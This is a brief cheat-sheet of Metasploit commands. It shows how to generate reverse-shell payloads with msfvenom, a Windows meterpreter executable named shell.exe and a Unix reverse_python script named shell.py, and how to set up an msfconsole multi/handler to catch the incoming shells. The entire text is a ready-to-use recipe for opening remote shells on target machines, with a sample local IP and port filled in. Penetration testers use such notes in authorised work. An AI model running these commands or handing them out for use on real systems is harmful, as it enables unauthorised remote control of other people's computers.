#metasploit framework

#generate payload

#in terminal

#for windows payload

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

#example: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.193 LPORT=4444 -f exe > shell.exe

#handlers

#Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

#in terminal

msfconsole

use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
exploit

#to generate payload code

msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

#it is excrypted to base64. so decode it for getting original code

